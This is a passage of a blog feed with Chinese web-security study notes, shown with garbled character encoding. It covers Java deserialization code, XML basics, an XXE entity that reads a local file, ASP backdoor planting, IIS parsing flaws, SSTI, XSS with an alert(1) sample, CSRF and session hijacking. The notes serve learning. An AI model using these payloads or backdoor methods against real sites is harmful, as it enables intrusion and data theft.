class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxeæ¼æ´</title>
      <link href="/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/03/10/xxe%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="XMLåŸºç¡€"><a href="#XMLåŸºç¡€" class="headerlink" title="XMLåŸºç¡€"></a><strong>XMLåŸºç¡€</strong></h3><p><a href="https://so.csdn.net/so/search?q=XML%E6%96%87%E6%A1%A3&spm=1001.2101.3001.7020">XMLæ–‡æ¡£</a>ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XMLç”³æ˜--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§ç™½è¯è§£é‡Šä¸‹</p><h3 id="å¤§ç™½è¯ç‰ˆXMLåŸºç¡€è®²è§£"><a href="#å¤§ç™½è¯ç‰ˆXMLåŸºç¡€è®²è§£" class="headerlink" title="å¤§ç™½è¯ç‰ˆXMLåŸºç¡€è®²è§£"></a><strong>å¤§ç™½è¯ç‰ˆXMLåŸºç¡€è®²è§£</strong></h3><hr><h4 id="1-XMLæ˜¯å•¥ï¼Ÿ"><a href="#1-XMLæ˜¯å•¥ï¼Ÿ" class="headerlink" title="1. XMLæ˜¯å•¥ï¼Ÿ"></a><strong>1. XMLæ˜¯å•¥ï¼Ÿ</strong></h4><p>XMLå…¨ç§°<strong>å¯æ‰©å±•æ ‡è®°è¯­è¨€</strong>ï¼Œä½ å¯ä»¥æŠŠå®ƒç†è§£æˆä¸€ç§<strong>â€œçº¯æ–‡æœ¬ç‰ˆçš„æ•°æ®æ”¶çº³ç›’â€</strong>ã€‚å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯<strong>å­˜å‚¨å’Œä¼ è¾“ç»“æ„åŒ–çš„æ•°æ®</strong>ï¼Œæ¯”å¦‚å•†å“ä¿¡æ¯ã€ç”¨æˆ·èµ„æ–™ç­‰ã€‚ä¸¾ä¸ªæ —å­ğŸŒ°ï¼š</p><ul><li><strong>HTML</strong>ï¼ˆç½‘é¡µè¯­è¨€ï¼‰ï¼šè´Ÿè´£æŠŠæ•°æ®æ’ç‰ˆæˆå¥½çœ‹çš„é¡µé¢ï¼Œæ¯”å¦‚å­—ä½“é¢œè‰²ã€è¡¨æ ¼å¸ƒå±€ã€‚</li><li><strong>XML</strong>ï¼šåªå…³å¿ƒæ•°æ®æœ¬èº«é•¿å•¥æ ·ï¼Œæ¯”å¦‚ä¸€ä¸ªå•†å“çš„åå­—ã€ä»·æ ¼ã€åº“å­˜é‡ã€‚</li></ul><blockquote><p>ğŸ“Œ <strong>å…³é”®ç‰¹ç‚¹</strong>ï¼šæ ‡ç­¾å¯ä»¥è‡ªå®šä¹‰ï¼ˆæ¯”å¦‚ <code>&lt;æ‰‹æœºå‹å·&gt;å°ç±³13&lt;/æ‰‹æœºå‹å·&gt;</code>ï¼‰ï¼Œä¸åƒHTMLåªèƒ½ç”¨å›ºå®šæ ‡ç­¾ï¼ˆå¦‚ <code>&lt;p&gt;</code>ï¼‰</p><p><strong>1</strong></p><p><strong>3</strong></p><p><strong>5</strong></p><p>ã€‚</p></blockquote><hr><h4 id="2-XMLé•¿ä»€ä¹ˆæ ·ï¼Ÿ"><a href="#2-XMLé•¿ä»€ä¹ˆæ ·ï¼Ÿ" class="headerlink" title="2. XMLé•¿ä»€ä¹ˆæ ·ï¼Ÿ"></a><strong>2. XMLé•¿ä»€ä¹ˆæ ·ï¼Ÿ</strong></h4><p>XMLæ–‡æ¡£å°±åƒ<strong>å®¶è°±</strong>ï¼Œå¿…é¡»æœ‰ä¸€ä¸ª<strong>â€œè€ç¥–å®—â€æ ¹æ ‡ç­¾</strong>ï¼Œå…¶ä»–æ ‡ç­¾å±‚å±‚åµŒå¥—ã€‚æ¯”å¦‚ï¼š</p><p>xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  <span class="comment">&lt;!-- æ–‡æ¡£å£°æ˜ï¼ˆå‘Šè¯‰ç”µè„‘è¿™æ˜¯XMLï¼‰ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">è¶…å¸‚</span>&gt;</span>  <span class="comment">&lt;!-- æ ¹æ ‡ç­¾ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">å•†å“</span> <span class="attr">åˆ†ç±»</span>=<span class="string">&quot;é¥®æ–™&quot;</span>&gt;</span>  <span class="comment">&lt;!-- å­æ ‡ç­¾ï¼Œå¸¦å±æ€§ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">åç§°</span>&gt;</span>å¯ä¹<span class="tag">&lt;/<span class="name">åç§°</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ä»·æ ¼</span>&gt;</span>3.5<span class="tag">&lt;/<span class="name">ä»·æ ¼</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">åº“å­˜</span>&gt;</span>100<span class="tag">&lt;/<span class="name">åº“å­˜</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">å•†å“</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">è¶…å¸‚</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><?xml version="1.0" encoding="UTF-8"?>  <!-- æ–‡æ¡£å£°æ˜ï¼ˆå‘Šè¯‰ç”µè„‘è¿™æ˜¯XMLï¼‰ -->&lt;è¶…å¸‚&gt;  <!-- æ ¹æ ‡ç­¾ --><br>  &lt;å•†å“ åˆ†ç±»&#x3D;â€é¥®æ–™â€&gt;  <!-- å­æ ‡ç­¾ï¼Œå¸¦å±æ€§ --><br>&lt;åç§°&gt;å¯ä¹&lt;&#x2F;åç§°&gt;<br>&lt;ä»·æ ¼&gt;3.5&lt;&#x2F;ä»·æ ¼&gt;<br>&lt;åº“å­˜&gt;100&lt;&#x2F;åº“å­˜&gt;<br>  &lt;&#x2F;å•†å“&gt;<br>&lt;&#x2F;è¶…å¸‚&gt;</li></ul><hr><h4 id="3-XMLçš„è§„çŸ©ï¼ˆè¯­æ³•ï¼‰"><a href="#3-XMLçš„è§„çŸ©ï¼ˆè¯­æ³•ï¼‰" class="headerlink" title="3. XMLçš„è§„çŸ©ï¼ˆè¯­æ³•ï¼‰"></a><strong>3. XMLçš„è§„çŸ©ï¼ˆè¯­æ³•ï¼‰</strong></h4><p>3.XMLçš„è§„çŸ© (è¯­æ³•)<br>1.ä¸¥æ ¼å¤§å°å†™ï¼š<Price>å’Œ<price>æ˜¯ä¿©ä¸åŒçš„æ ‡ç­¾ï¼Œç”µè„‘ä¼šè®¤é”™68ã€‚<br>2.ä¸èƒ½çèµ·åï¼š<br>ï¼‰Ã—ä¸èƒ½ç”¨æ•°å­—å¼€å¤´ï¼ˆå¦‚1&lt;1å·å•†å“&gt;<br>Â·Ã—ä¸èƒ½æœ‰ç©ºæ ¼ï¼ˆå¦‚&lt;å•†å“åç§°&gt;ï¼‰<br>Â·Ã—åˆ«ç”¨ç‰¹æ®Šç¬¦å·ï¼ˆå¦‚ï¼šæˆ–-ï¼‰<br>3.èº²å¼€ç‰¹æ®Šå­—ç¬¦ï¼šæ¯”å¦‚&lt;è¦å†™æˆ&amp;ltï¼›ï¼Œå¦åˆ™ç”µè„‘ä¼šä»¥ä¸ºæ˜¯æ–°æ ‡ç­¾ã€‚<br>4.æ³¨é‡Šå†™æ³•ï¼š<!--è¿™æ˜¯æ³¨é‡Š-->ï¼Œä¸èƒ½åµŒå¥—ã€‚</p><hr><h4 id="4-XMLèƒ½å¹²å•¥ç”¨ï¼Ÿ"><a href="#4-XMLèƒ½å¹²å•¥ç”¨ï¼Ÿ" class="headerlink" title="4. XMLèƒ½å¹²å•¥ç”¨ï¼Ÿ"></a><strong>4. XMLèƒ½å¹²å•¥ç”¨ï¼Ÿ</strong></h4><p>1. </p><p>   ä¼ æ•°æ®</p><p>   ï¼šæ¯”å¦‚APPå’ŒæœåŠ¡å™¨ä¹‹é—´ä¼ è®¢å•ä¿¡æ¯ï¼Œç”¨XMLæ‰“åŒ…æ•°æ®ï¼ŒåŒæ–¹éƒ½èƒ½çœ‹æ‡‚</p><p>   <strong>3</strong></p><p>   <strong>7</strong></p><p>   ã€‚</p><p>2. </p><p>   å½“é…ç½®æ–‡ä»¶</p><p>   ï¼šå¾ˆå¤šè½¯ä»¶çš„è®¾ç½®æ–‡ä»¶ï¼ˆæ¯”å¦‚Javaçš„Springæ¡†æ¶ï¼‰ç”¨XMLå­˜å‚æ•°</p><p>   <strong>3</strong></p><p>   <strong>8</strong></p><p>   ã€‚</p><p>3. </p><p>   å°å‹æ•°æ®åº“</p><p>   ï¼šæ¯”å¦‚å­˜å‡ ç™¾æœ¬ä¹¦çš„ä¿¡æ¯ï¼Œæ–¹ä¾¿éšæ—¶è¯»å–</p><p>   <strong>3</strong></p><p>   <strong>4</strong></p><p>   ã€‚</p><p>4. </p><p>   è§„èŒƒæ•°æ®æ ¼å¼</p><p>   ï¼šæ¯”å¦‚ç”µå•†å¹³å°è¦æ±‚æ‰€æœ‰å•†å®¶ç”¨ç»Ÿä¸€çš„XMLæ ¼å¼ä¸Šä¼ å•†å“</p><p>   <strong>4</strong></p><p>   <strong>7</strong></p><p>   ã€‚</p><hr><h4 id="5-ä¸¾ä¸ªå®é™…ä¾‹å­"><a href="#5-ä¸¾ä¸ªå®é™…ä¾‹å­" class="headerlink" title="5. ä¸¾ä¸ªå®é™…ä¾‹å­"></a><strong>5. ä¸¾ä¸ªå®é™…ä¾‹å­</strong></h4><p>å‡è®¾ä½ è¦ç”¨XMLå­˜å­¦ç”Ÿä¿¡æ¯ï¼š</p><p>xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ç­çº§</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">å­¦ç”Ÿ</span> <span class="attr">å­¦å·</span>=<span class="string">&quot;001&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">å§“å</span>&gt;</span>å¼ ä¸‰<span class="tag">&lt;/<span class="name">å§“å</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">å¹´é¾„</span>&gt;</span>18<span class="tag">&lt;/<span class="name">å¹´é¾„</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">æˆç»©</span>&gt;</span>90<span class="tag">&lt;/<span class="name">æˆç»©</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">å­¦ç”Ÿ</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">å­¦ç”Ÿ</span> <span class="attr">å­¦å·</span>=<span class="string">&quot;002&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">å§“å</span>&gt;</span>æå››<span class="tag">&lt;/<span class="name">å§“å</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">å¹´é¾„</span>&gt;</span>19<span class="tag">&lt;/<span class="name">å¹´é¾„</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">æˆç»©</span>&gt;</span>85<span class="tag">&lt;/<span class="name">æˆç»©</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">å­¦ç”Ÿ</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ç­çº§</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>æ ¹æ ‡ç­¾</strong>ï¼š<code>&lt;ç­çº§&gt;</code></li><li><strong>åµŒå¥—ç»“æ„</strong>ï¼šæ¯ä¸ªå­¦ç”Ÿä¿¡æ¯åŒ…è£¹åœ¨ <code>&lt;å­¦ç”Ÿ&gt;</code> é‡Œï¼Œå±æ€§ <code>å­¦å·</code> åŒºåˆ†ä¸åŒå­¦ç”Ÿ</li></ul><p><strong>XML &#x3D; è‡ªå®šä¹‰æ ‡ç­¾ + ç»“æ„åŒ–æ•°æ® + ä¸¥æ ¼è¯­æ³•</strong>ã€‚å®ƒåƒä¸€å¼ ä¸‡èƒ½è¡¨æ ¼ï¼Œèƒ½æŠŠæ‚ä¹±çš„æ•°æ®æ•´ç†å¾—äº•äº•æœ‰æ¡ï¼Œæ–¹ä¾¿ç”µè„‘å’Œäººä¸€èµ·çœ‹æ‡‚ã€‚å­¦XMLçš„é‡ç‚¹æ˜¯ï¼š<strong>æ ‡ç­¾åˆ«å†™é”™ã€å±æ€§åŠ å¼•å·ã€ç»“æ„è¦æ¸…æ™°</strong>ï¼</p><h5 id="xmlè¯­è¨€çš„æ ¼å¼"><a href="#xmlè¯­è¨€çš„æ ¼å¼" class="headerlink" title="xmlè¯­è¨€çš„æ ¼å¼"></a>xmlè¯­è¨€çš„æ ¼å¼</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>   //xmlçš„å£°æ˜  </span><br><span class="line"> <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ELEMENT <span class="keyword">foo</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file://d:/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"> ]&gt;</span>                                      //DTDéƒ¨åˆ†</span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span>                          //xmléƒ¨åˆ†</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç¬¬ä¸€å¥æ˜¯å£°æ˜ï¼Œå£°æ˜è¿™æ˜¯ä¸€æ®µxmlä»£ç ï¼Œæ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªDTDçš„éƒ¨åˆ†ï¼Œæ„æ€æ˜¯è¯»å–dç›˜ä¸Šçš„1.txtæ–‡ä»¶ã€‚æ¯”å¦‚æˆ‘ä»¬ç»å¸¸è¦ç”¨åˆ°æŸä¸€ç»„æ•°æ®ï¼Œé‚£ä¹ˆæ¯æ¬¡éƒ½å¼•ç”¨ï¼Œè‚¯å®šæ˜¯éå¸¸ä¸æ–¹ä¾¿çš„ï¼Œæ‰€ä»¥æŠŠè¿™ç»„ç»å¸¸ç”¨çš„æ•°æ®è®¾ç½®æˆä¸ºä¸€ä¸ªå˜é‡ï¼Œéœ€è¦çš„æ—¶å€™ç›´æ¥è°ƒç”¨è¿™ä¸ªå˜é‡ï¼Œé€šè¿‡ä»¥ä¸Šçš„è§£é‡Šï¼Œæˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼Œxmlå¦‚æœäº§ç”Ÿæ¼æ´ï¼Œé‚£è‚¯å®šå°±æ˜¯åœ¨è¿™ä¸ªDTDéƒ¨åˆ†ï¼Œæœ€ååˆ™æ˜¯xmléƒ¨åˆ†ã€‚</p><p>ä¸€é“javaé¢˜ç›®ç»“åˆxxeæ¼æ´</p><h5 id="CVE-2019-12415"><a href="#CVE-2019-12415" class="headerlink" title="CVE-2019-12415"></a>CVE-2019-12415</h5><p>ä¹‹å‰åˆ·é¢˜ç½‘é¼æ¯ç¢°åˆ°çš„ é¡ºä¾¿å¤ä¹ äº†ä¸‹xxeï¼ˆå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼‰</p>]]></content>
      
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·Ÿç€å°è¿ªçš„ç¬¬å››å¤©</title>
      <link href="/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/"/>
      <url>/2025/03/09/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E5%9B%9B%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p>ASPå®‰å…¨</p><p>é‡åˆ°çš„æ¯”è¾ƒå°‘è¿™é‡Œå°±ä¸å»å¤ç°äº†ç›´æ¥å¹²çœ‹è¯¾ç¨‹äº†</p><p>window asp iis access(sqlsever)</p><p>ä¸­é—´ä»¶é—®é¢˜ æ•°æ®åº“é—®é¢˜ è¯­è¨€é—®é¢˜</p><p>aceess æ•°æ®åº“ ä¸€èˆ¬åç¼€å asp asa mdb(ä¸‹è½½)</p><p>mdbé»˜è®¤ä¸‹è½½</p><p>mdbæ–‡ä»¶åœ¨ç½‘ç«™ç›®å½•ä¸‹</p><p>æ€è·¯ï¼šçŸ¥é“æ•°æ®åº“åœ°å€å°±å¯ä»¥å°è¯•ä¸‹è½½è·å–æ•°æ®åº“æ–‡ä»¶ è·å–å½“å‰ç®¡ç†å‘˜è´¦å·ä¿¡æ¯</p><p>å§n</p><p>aspåé—¨ä¸Šä¼ </p><p>ASPçš„æ•°æ®åº“æ–‡ä»¶é™¤äº†å¯ä»¥ä»¥mdbç»“å°¾ï¼Œä¹Ÿèƒ½ä»¥aspç»“å°¾ï¼Œç”±äºmdbæ–‡ä»¶èƒ½ä¸‹è½½è€Œaspæ–‡ä»¶ä¼šè¢«æ‰§è¡Œï¼Œå› æ­¤å½“æˆ‘ä»¬è®¿é—®ä»¥aspç»“å°¾çš„æ•°æ®åº“æ–‡ä»¶æ—¶åªèƒ½çœ‹åˆ°ä¹±ç æ•°æ®è€Œä¸ä¼šè‡ªåŠ¨ä¸‹è½½ï¼Œä½†ä¾æ—§å¯ä»¥å°†ä¹±ç å†…å®¹å¤åˆ¶åˆ°è®°äº‹æœ¬ä¸­ï¼Œå†å°†æ–‡ä»¶åç¼€ä¿®æ”¹æˆmdbï¼Œå³å¯çœ‹åˆ°æ­£å¸¸å†…å®¹ã€‚</p><p>åé—¨æ¤å…¥ASPçš„åŸç†æ˜¯å½“ç½‘ç«™å­˜åœ¨ç”¨æˆ·è¾“å…¥æ•°æ®å¹¶è¢«ä¿å­˜åœ¨æ•°æ®åº“ä¸­æ—¶ï¼ˆä¾‹å¦‚ç•™è¨€ä¿¡æ¯ï¼‰ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥ç²¾å¿ƒç¼–å†™çš„ASPæ‰§è¡Œè¯­å¥ï¼ˆç±»ä¼¼ä¸€å¥è¯æœ¨é©¬ï¼Œä½†çœ‹èµ·æ¥æ˜¯ä¹±ç çš„ï¼‰ï¼Œç„¶åæœåŠ¡å™¨å°†å…¶å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬å†è®¿é—®è¿™ä¸ªaspæ•°æ®åº“æ–‡ä»¶ï¼Œç”±äºæœåŠ¡å™¨ä¼šæŠŠè¿™ä¸ªæ–‡ä»¶å½“æˆASPè§£é‡Šæ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬çš„æ‰§è¡Œè¯­å¥ä¹Ÿä¼šè¢«æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™å†ç”¨èœåˆ€ç­‰è¿æ¥å·¥å…·å³å¯æ‹¿ä¸‹æœåŠ¡å™¨ã€‚<br> IIS ä¸­é—´ä»¶è§£ææ¼æ´</p><p>ç¬¬ä¸€ä¸ªå°±æ˜¯æ–‡ä»¶å¤¹æœ‰aspåç¼€ é‡Œé¢çš„æ–‡ä»¶å…¨éƒ½æŒ‰ç…§aspè¿›è¡Œè§£æ</p><p>è¿˜æœ‰ä¸€ç§è§£ææ¼æ´å‘½å</p><p>IIS PUTä¸Šä¼ æ¼æ´ï¼ŒæœåŠ¡å™¨å¼€å¯å†™å…¥åŠŸèƒ½æ‰ä¼šæœ‰è¿™ä¸ªæ¼æ´ï¼Œä¸è¿‡æ¯”è¾ƒå°‘è§</p><p>php å’Œjava æ²¡è®°å½•äº† </p><p>ç›´æ¥è®°å½•python</p><p>ssti </p><p>æ¨¡æ¿ ç›¸å½“äºæ‰‹æœºä¸»é¢˜å·®ä¸éƒ½æ„æ€</p><p>å­—èŠ‚ç æ–‡ä»¶ï¼ˆbytecodeï¼‰ï¼Œpycæ–‡ä»¶ç»è¿‡pythonè§£é‡Šå™¨<br>æœ€ç»ˆä¼šç”Ÿæˆæœºå™¨ç è¿è¡Œã€‚å› æ­¤pycæ–‡ä»¶æ˜¯å¯ä»¥è·¨å¹³å°éƒ¨ç½²çš„ï¼Œç±»ä¼¼Javaçš„.classæ–‡ä»¶ï¼Œ<br>èˆ¬pyæ–‡ä»¶æ”¹å˜åï¼Œéƒ½ä¼šé‡æ–°ç”Ÿæˆpycæ–‡ä»¶ã€‚</p><p> é‚£ä¹ˆå°±å¯ä»¥åç¼–è¯‘è·å¾—æºç æ–‡ä»¶</p><pre><code>1ã€ä»€ä¹ˆæ˜¯sSTIï¼Ÿæœ‰ä»€ä¹ˆæ¼æ´å±å®³ï¼Ÿ</code></pre><p>æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸ºWeåº”ç”¨æ¨¡<br>æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡<br>æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShe11ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»<br>è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> xiaodisec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·Ÿç€å°è¿ªçš„ç¬¬ä¸‰å¤©</title>
      <link href="/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/"/>
      <url>/2025/03/08/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%B8%89%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p>phpå¼€å‘</p><p>è¿™ä¸ªè¯¾å¬ç€æ— èŠ</p><?phpmysql_connect()//æ•°æ®åº“è¿æ¥mysal_select_db()//é€‰æ‹©åº“?><p>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</p><p>æ˜¯è‡ªå·±å†™çš„è¿˜æ˜¯åº”ç”¨çš„åˆ«äººçš„æ¡†æ¶</p><p>æ–‡ä»¶ä¸‹è½½</p><p>ç›´æ¥ä¸‹è½½ å’Œä¼ å‚ä¸‹è½½</p><p>æ–‡ä»¶åˆ é™¤iåŸºæœ¬ä¸Šç¢°ä¸åˆ°äº†</p><p>æ–‡ä»¶å†™å…¥</p><p>webæ¼æ´æ ¸å¿ƒ å¯æ§å˜é‡å’Œç‰¹å®šå‡½æ•°</p><p>è¾“å…¥è¾“å‡ºç±»å®‰å…¨é—®é¢˜</p><p>xssæ¼æ´</p><p>åå°„ï¼šå­˜å‚¨ï¼šdom</p><p>è¾“å…¥çš„å†…å®¹ç›´æ¥æ˜¾ç¤ºå‡ºæ¥</p><p> å¯¼è‡´å‰ç«¯ç›´æ¥æ‰§è¡Œjsä»£ç </p><script>alert(1)</script><p>å…¨å±€å˜é‡$_SERVER</p><p>æ•°æ®åŒ…çš„æ‰€æœ‰è¯·æ±‚å¤´</p><p>csrfè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ </p><p> åå°ç®¡ç†ç³»ç»Ÿæœ‰å¤šä¸ªæ–‡ä»¶é¡µé¢ï¼Œä¸ºäº†æ–¹ä¾¿éªŒè¯ï¼Œä¸€èˆ¬ä¼šé€‰ç”¨cookieæˆ–sessionè¿›è¡ŒéªŒè¯<br>cookieï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°å®¢æˆ·ç«¯æµè§ˆå™¨å†…<br>sessionï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°æœåŠ¡ç«¯æœåŠ¡å™¨å†…</p><p>æœªæˆæƒè®¿é—®</p><p>ç™»å½•åçš„é¡µé¢æ²¡æœ‰éªŒè¯æ˜¯å¦ç™»å½•æˆåŠŸ</p><p>éªŒè¯æ–¹å¼cookie,session</p><p>cookieï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°å®¢æˆ·ç«¯æµè§ˆå™¨å†…<br>cookieå®‰å…¨ï¼šcookieä¿®æ”¹ä¼ªé€ ç›—å–<br>sessionï¼šèº«ä»½éªŒè¯å­˜å‚¨åˆ°æœåŠ¡ç«¯æœåŠ¡å™¨å†…<br>sessionå®‰å…¨ï¼šä¼šè¯åŠ«æŒï¼ˆsessionåŠ«æŒï¼‰</p><p>éªŒè¯ç å¤ç”¨</p><p>å…ˆè¾“å…¥æ­£ç¡®å¯†ç 